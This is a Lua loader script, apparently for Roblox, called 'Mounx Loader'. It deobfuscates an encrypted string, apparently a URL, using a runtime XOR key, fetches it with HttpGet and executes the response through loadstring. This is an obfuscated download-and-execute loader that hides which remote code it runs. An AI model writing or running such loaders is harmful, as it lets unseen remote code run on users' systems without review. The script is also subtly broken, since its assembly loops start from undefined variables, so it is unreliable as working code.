-- Mounx Loader
-- Protected by Mounx Security Layer v3
-- Unauthorized modification will result in ban

local _s = string
local _c = _s.char
local _b = _s.byte
local _x = bit32.bxor
local _t = table
local _tc = _t.concat
local _g = game

-- Environment validation
local ___fiwg = type(_g) == "userdata"
local __kitav = type(loadstring) == "function" or type(load) == "function"
if not (___fiwg and __kitav) then return end

-- Integrity check
local _peojx = pcall(function() return _g:GetService("Players").LocalPlayer end)
if not _peojx then return end

-- Runtime key derivation
local ___uexzzeb = {}
___uexzzeb[8]=_c(_x(192,0xAB))
___uexzzeb[6]=_c(143-86)
___uexzzeb[7]=_c(_x(241,0xAB))
___uexzzeb[5]=_c(196/4)
___uexzzeb[10]=_c(23+32)
___uexzzeb[9]=_c(19+36)
___uexzzeb[2]=_c(_x(211,0xAB))
___uexzzeb[11]=_c(_x(155,0xAB))
___uexzzeb[1]=_c(106-29)
___uexzzeb[4]=_c(260/5)
___uexzzeb[3]=_c(265/5)
___uexzzeb = _tc(___uexzzeb)

-- Encrypted payload segments
local ___hddtlw = {37,12,65,68,66,3,117,68}
local ___dcwbny = {90,88,69,35,0,69,85,95}
local ___ucshz = {92,54,69,88,89,66,40,22}
local __hrgow = {81,81,67,23,57,4,90,24}
local _flns = {81,61,17,26,88,94,88,62}
local __bed = {14,69}

-- Assemble payload
local __pmsae = {}
for _=__kgh,#___hddtlw do __pmsae[#__pmsae+1]=___hddtlw[_] end
for _=__jjuii,#___dcwbny do __pmsae[#__pmsae+1]=___dcwbny[_] end
for _=__bkt,#___ucshz do __pmsae[#__pmsae+1]=___ucshz[_] end
for _=__axblfz,#__hrgow do __pmsae[#__pmsae+1]=__hrgow[_] end
for _=_tvjmh,#_flns do __pmsae[#__pmsae+1]=_flns[_] end
for _=___wiojt,#__bed do __pmsae[#__pmsae+1]=__bed[_] end

-- Decryption engine
local __jaq = {}
for _i = 1, #__pmsae do
    local _e = __pmsae[_i]
    local _k = _b(___uexzzeb, ((_i - 1) % #___uexzzeb) + 1)
    __jaq[_i] = _c(_x(_e, _k))
end
__jaq = _tc(__jaq)

-- Secure execution pipeline
local __fxyusx = tick()
local __hxosk = _g["HttpGet"](_g, __jaq)

if type(__hxosk) == "string" and #__hxosk > 0 then
    local ___qwp = (loadstring or load)(__hxosk)
    if ___qwp then
        ___qwp()
    end
end
